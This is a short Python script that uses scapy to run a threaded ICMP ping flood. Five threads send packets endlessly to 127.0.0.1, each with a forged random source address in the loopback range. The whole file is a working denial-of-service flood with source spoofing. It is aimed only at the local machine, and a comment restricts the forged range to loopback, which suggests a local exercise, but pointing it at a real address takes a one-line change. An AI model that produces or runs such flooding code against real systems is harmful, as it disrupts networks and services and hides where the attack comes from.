from scapy.all import IP, ICMP, send
import random
import threading

def random_ip():
    # Ensure the source IP is within the valid range for the loopback network
    return "127.0.0." + str(random.randint(2, 255))

def ping_flood():
    while True:
        send(IP(src=random_ip(), dst="127.0.0.1") / ICMP(), loop=0, inter=0.01)

# Number of threads
num_threads = 5

# Create and start threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=ping_flood)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()
